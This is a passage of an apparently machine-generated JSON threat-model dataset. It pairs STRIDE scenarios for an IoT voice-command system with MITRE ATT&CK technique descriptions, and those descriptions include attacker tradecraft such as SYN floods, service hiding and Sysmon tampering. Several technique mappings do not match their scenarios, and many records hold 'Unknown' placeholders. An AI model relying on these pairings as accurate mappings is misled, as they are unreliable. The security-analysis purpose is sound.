Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
                "id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
                "technique_id": "T1598"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the microphone with spurious signals to prevent legitimate voice commands from being recognized.",
            "Assumptions": [
                {
                    "Assumption": "The microphone does not filter out abnormal or excessive signal inputs.",
                    "Role": "Microphone",
                    "Condition": "Lack of input signal filtering."
                },
                {
                    "Assumption": "The attacker has the means to produce and direct spurious signals toward the microphone.",
                    "Role": "Attacker",
                    "Condition": "Capability to generate and direct signals."
                },
                {
                    "Assumption": "The system does not differentiate between legitimate and illegitimate voice commands effectively.",
                    "Role": "System",
                    "Condition": "Ineffective noise discrimination."
                }
            ],
            "Potential Impact": "Disruption to voice command functionality, affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "audio flooding",
                "microphone disruption",
                "voice command interference",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--35eb0c22-6caf-46ce-8869-5964bd735858",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the server processing capabilities with excessive requests.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is aware of the API endpoints and can send large volumes of requests.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of API endpoints."
                },
                {
                    "Assumption": "The server does not have adequate rate limiting or request throttling mechanisms.",
                    "Role": "Server",
                    "Condition": "Lack of rate limiting."
                },
                {
                    "Assumption": "Network infrastructure can be utilized by the attacker to generate high traffic.",
                    "Role": "Network",
                    "Condition": "Attacker has enough network resources."
                }
            ],
            "Potential Impact": "Server becomes overloaded and unresponsive, impacting service availability.",
            "MITRE ATT&CK Keywords": [
                "API flooding",
                "server overload",
                "high traffic",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Compromised IoT controller sending repeated invalid commands to IoT devices, causing them to halt.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller can send commands without validation or throttling.",
                    "Role": "IoT Controller",
                    "Condition": "Weak command validation and throttling policies."
                },
                {
                    "Assumption": "The attacker has gained control over the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Compromise of IoT controller."
                },
                {
                    "Assumption": "IoT devices do not validate commands or handle error states properly.",
                    "Role": "IoT Device",
                    "Condition": "Poor error handling and validation."
                }
            ],
            "Potential Impact": "Disruption of IoT device operations, leading to unavailability.",
            "MITRE ATT&CK Keywords": [
                "controller compromise",
                "invalid commands",
                "device halt",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has an unpatched vulnerability.",
                    "Role": "Client-side Application",
                    "Condition": "Existing vulnerability not addressed."
                },
                {
                    "Assumption": "The attacker can interact with or exploit the vulnerable application.",
                    "Role": "Attacker",
                    "Condition": "Means to exploit vulnerability."
                },
                {
                    "Assumption": "There are insufficient privilege separation mechanisms within the application.",
                    "Role": "Application Design",
                    "Condition": "Lack of privilege separation."
                }
            ],
            "Potential Impact": "Gain of elevated privileges, compromising application and data integrity.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "privilege escalation",
                "client application",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An adversary manipulates server-side application settings to gain unauthorized elevated access.",
            "Assumptions": [
                {
                    "Assumption": "Server-side application has insufficient access controls.",
                    "Role": "Server-side Application",
                    "Condition": "Weak or missing access controls."
                },
                {
                    "Assumption": "The attacker can gain access to the server-side application to manipulate settings.",
                    "Role": "Attacker",
                    "Condition": "Successful access to application."
                },
                {
                    "Assumption": "System configuration changes are not adequately monitored or audited.",
                    "Role": "System",
                    "Condition": "Lack of effective monitoring and auditing."
                }
            ],
            "Potential Impact": "Unauthorized elevated access leading to system control and data compromise.",
            "MITRE ATT&CK Keywords": [
                "configuration manipulation",
                "server access",
                "elevated privileges",
                "access control bypass"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware installed on IoT devices through a compromised IoT controller allows for elevated command execution.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller does not validate firmware updates or commands properly.",
                    "Role": "IoT Controller",
                    "Condition": "Weak command and update validation."
                },
                {
                    "Assumption": "The attacker has control over or can compromise the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Compromise of IoT controller."
                },
                {
                    "Assumption": "IoT devices do not have layered security measures to prevent unauthorized command execution.",
                    "Role": "IoT Device",
                    "Condition": "Lack of layered security."
                }
            ],
            "Potential Impact": "Execution of elevated commands on IoT devices, compromising functionality and data integrity.",
            "MITRE ATT&CK Keywords": [
                "malware installation",
                "command execution",
                "IoT device compromise",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user and sends voice commands to access restricted areas through IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access the microphone or compromise it remotely.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to the device."
                },
                {
                    "Assumption": "The system cannot distinguish between legitimate and spoofed voice commands.",
                    "Role": "System Developer",
                    "Condition": "Lack of advanced voice recognition mechanisms."
                },
                {
                    "Assumption": "The attacker has knowledge of the required voice commands.",
                    "Role": "Attacker",
                    "Condition": "Insider information or eavesdropping on previous interactions."
                }
            ],
            "Potential Impact": "Unauthorized access leading to security breaches and data theft.",
            "MITRE ATT&CK Keywords": [
                "Masquerading",
                "Voice Command Spoofing",
                "Physical Access",
                "Remote Compromise"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the server-side application to issue commands to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and manipulate communications between the client and server.",
                    "Role": "Attacker",
                    "Condition": "Presence on the same network or MitM attack capability."
                },
                {
                    "Assumption": "Weak or absent encryption of communication channels.",
                    "Role": "System Administrator",
                    "Condition": "Lack of proper SSL/TLS implementation."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Local network access or compromised network devices."
                }
            ],
            "Potential Impact": "Execution of unauthorized actions on IoT devices, leading to potential physical damage or alteration of the intended operations.",
            "MITRE ATT&CK Keywords": [
                "Masquerading",
                "Man-in-the-Middle",
                "Network Interception",
                "Unencrypted Traffic"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker forges authentication tokens to gain access to sensitive functionalities of the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to create or steal valid authentication tokens.",
                    "Role": "Attacker",
                    "Condition": "Access to vulnerabilities or insider theft."
                },
                {
                    "Assumption": "The authentication mechanism relies on token validation.",
                    "Role": "System Developer",
                    "Condition": "Use of token-based authentication."
                },
                {
                    "Assumption": "The tokens are not periodically refreshed or invalidated.",
                    "Role": "System Administrator",
                    "Condition": "Weak token management practices."
                }
            ],
            "Potential Impact": "Gaining unauthorized access to sensitive data and management functionalities, compromising system security.",
            "MITRE ATT&CK Keywords": [
                "Token Forgery",
                "Authentication Bypass",
                "Session Hijacking",
                "Credential Theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor alters firmware on IoT devices to modify the behavior of the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the IoT device or its update process.",
                    "Role": "Attacker",
                    "Condition": "Physical access or vulnerability exploitation."
                },
                {
                    "Assumption": "Firmware updates are not securely verified or encrypted.",
                    "Role": "System Developer",
                    "Condition": "Lack of firmware integrity validation."
                },
                {
                    "Assumption": "Firmware can be updated without proper authorization checks.",
                    "Role": "System Developer",
                    "Condition": "Poor update mechanisms."
                }
            ],
            "Potential Impact": "Corrupt or malicious firmware can lead to improper functioning, data corruption, and loss of control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "Firmware Modification",
                "Tampering",
                "Update Exploitation",
                "Malware Injection"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies stored data in the cloud services to change command outcomes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to cloud storage services.",
                    "Role": "Attacker",
                    "Condition": "Compromise of cloud accounts or interfaces."
                },
                {
                    "Assumption": "Data integrity checks are weak or not present.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of cryptographic integrity checks."
                },
                {
                    "Assumption": "Cloud data access controls are misconfigured.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate security policies."
                }
            ],
            "Potential Impact": "Altered data can result in incorrect responses from IoT devices, leading to potential malfunction or unsafe states.",
            "MITRE ATT&CK Keywords": [
                "Cloud Data Tampering",
                "Data Integrity Attack",
                "Compromise of Cloud Services",
                "Configuration Weakness"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary injects malicious commands in the communication between the client and server applications.",
            "Assumptions": [
                {
                    "Assumption": "The communications are not properly encrypted and authenticated.",
                    "Role": "System Developer",
                    "Condition": "Absence of SSL/TLS encryption."
                },
                {
                    "Assumption": "The attacker can intercept and modify the communications.",
                    "Role": "Attacker",
                    "Condition": "MitM attack capability or compromised network."
                },
                {
                    "Assumption": "There are insufficient input validation checks on commands.",
                    "Role": "System Developer",
                    "Condition": "Lack of command validation security."
                }
            ],
            "Potential Impact": "Malicious commands can result in unauthorized actions, compromising the integrity and operation of the system.",
            "MITRE ATT&CK Keywords": [
                "Command Injection",
                "MitM Attack",
                "Communication Tampering",
                "Network Compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user performs unauthorized actions but denies responsibility due to lack of logging.",
            "Assumptions": [
                {
                    "Assumption": "Action logging and auditing mechanisms are not in place or are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive logging solutions."
                },
                {
                    "Assumption": "Access control mechanisms do not have non-repudiation features.",
                    "Role": "System Developer",
                    "Condition": "Weak access controls and lack of accountability."
                },
                {
                    "Assumption": "The user has the ability to perform actions that are not tracked.",
                    "Role": "User/Attacker",
                    "Condition": "Insufficient monitoring and control."
                }
            ],
            "Potential Impact": "Inability to trace and attribute actions leading to a lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Action Denial",
                "Logging Bypass",
                "Audit Tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker accesses the system and deletes logs to hide their activities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to log storage locations.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or remote access."
                },
                {
                    "Assumption": "Log integrity protections are weak or absent.",
                    "Role": "System Developer",
                    "Condition": "Insufficient log protection mechanisms."
                },
                {
                    "Assumption": "The logging system does not have real-time alerts for log modifications.",
                    "Role": "System Administrator",
                    "Condition": "Lack of real-time monitoring solutions."
                }
            ],
            "Potential Impact": "Loss of audit trails, making it difficult to detect and investigate unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "Log Deletion",
                "Stealth Activities",
                "Repudiation",
                "Audit Erasure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user modifies logs to falsify their level of access or actions taken.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored in a modifiable format without integrity checks.",
                    "Role": "System Developer",
                    "Condition": "Logs are stored in unprotected formats."
                },
                {
                    "Assumption": "The user has sufficient privileges to alter logs.",
                    "Role": "User/Attacker",
                    "Condition": "Elevated or administrative privileges."
                },
                {
                    "Assumption": "Log modifications are not monitored or controlled.",
                    "Role": "System Administrator",
                    "Condition": "Lack of monitoring and control systems."
                }
            ],
            "Potential Impact": "Corruption of system records making it easier to mask unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "Log Modification",
                "Privilege Abuse",
                "Access Falsification",
                "Audit Corruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts voice commands or responses during transmission, capturing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels are not encrypted.",
                    "Role": "System Developer",
                    "Condition": "Absence of SSL/TLS encryption."
                },
                {
                    "Assumption": "The attacker can gain access to the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network interception or MitM capability."
                },
                {
                    "Assumption": "Sensitive information is transmitted in plain text.",
                    "Role": "System Developer",
                    "Condition": "Lack of data encryption practices."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user data and commands.",
            "MITRE ATT&CK Keywords": [
                "Eavesdropping",
                "Data Interception",
                "Information Disclosure",
                "Unencrypted Communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious insider accesses sensitive data stored in cloud services without authorization.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access to cloud service accounts.",
                    "Role": "Insider",
                    "Condition": "Privileged or administrative access."
                },
                {
                    "Assumption": "Access controls within the cloud service are weak or misconfigured.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate cloud security policies."
                },
                {
                    "Assumption": "Cloud data is not encrypted or has weak encryption.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Poor data encryption practices."
                }
            ],
            "Potential Impact": "Disclosure of sensitive data leading to potential misuse or data breaches.",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Cloud Data Breach",
                "Unauthorized Access",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data in transit between IoT devices and the controller is captured by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted between devices is not encrypted.",
                    "Role": "System Developer",
                    "Condition": "Lack of end-to-end encryption."
                },
                {
                    "Assumption": "The attacker can intercept the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Network interception or MitM capability."
                },
                {
                    "Assumption": "Sensitive commands or data are transmitted over the network.",
                    "Role": "System Developer",
                    "Condition": "Data transmitted without encryption."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data or commands.",
            "MITRE ATT&CK Keywords": [
                "Network Interception",
                "Data in Transit",
                "Information Disclosure",
                "Unencrypted Communication"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
